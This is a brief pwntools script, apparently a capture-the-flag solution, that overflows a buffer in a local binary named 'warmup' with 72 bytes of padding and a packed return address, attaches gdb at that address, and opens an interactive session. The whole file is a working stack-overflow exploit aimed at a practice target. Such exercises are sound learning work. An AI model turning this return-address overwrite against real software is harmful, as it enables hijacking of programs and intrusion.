#!/usr/bin/env python
from pwn import *

io = process('./warmup')

# Construct payload for buffer overflow
bfr_oflw = b'A' * 72 + p64(0x0040060d)  # Use p64 for packing 64-bit integer (assuming address)

gdb.attach(io, gdbscript = 'b *  0x0040060d')

io.recvuntil(b'>')

io.sendline(bfr_oflw)

io.interactive()
